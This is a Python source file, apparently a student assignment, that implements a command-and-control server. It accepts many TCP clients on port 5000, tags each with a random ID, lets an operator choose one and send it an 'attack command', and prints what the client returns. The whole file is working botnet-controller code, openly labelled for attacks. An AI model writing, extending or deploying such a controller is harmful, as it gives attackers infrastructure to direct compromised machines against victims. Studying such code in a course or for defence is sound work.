# Aluno: erick Gushiken
import socket
import selectors
import threading
import random

clients = {}

def send_command():
  print("Conectados:", clients.keys())
  try:
    client = int(input("Selecionar cliente:"))
    if clients.get(client):
      command = input("Comando de ataque:")
      clients.get(client)[0].sendall(str.encode(command))
  except:
    return
  finally:
    return send_command()

inputThread = threading.Thread(target=send_command)
inputThread.daemon = True

sel = selectors.DefaultSelector()
def accept(sock, mask):
    global clients
    identifier = random.randint(0,10000)
    conn, addr = sock.accept()  # Should be ready
    print('conectado', addr, 'identificador:', identifier)
    conn.setblocking(False)
    sel.register(conn, selectors.EVENT_READ, read)
    clients[identifier]=[conn,addr]

def read(conn, mask):
    try:
      data = conn.recv(1024)  # Should be ready
      if data:
        for key in clients.keys():
          if clients.get(key)[0] == conn:
            client = clients.get(key)
            print("Cliente:", key," endereço(IP,port):",client[1], " resposta:")
        print()
        print(repr(data))
      else:
        print('closing', conn)
        sel.unregister(conn)
        conn.close()
    except:
      identifier=''
      for key in clients.keys():
        if clients.get(key)[0] == conn:
          print("Cliente ", key," desconectado.")
          identifier = key
          break
      if identifier != '':
        clients.pop(identifier,None)

HOST = ''
PORT = 5000
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(100)
sock.setblocking(False)
sel.register(sock, selectors.EVENT_READ, accept)

def run_server():
  while True:
    events = sel.select()
    for key, mask in events:
      callback = key.data
      callback(key.fileobj, mask)

serverThread = threading.Thread(target=run_server)
serverThread.start()
inputThread.start()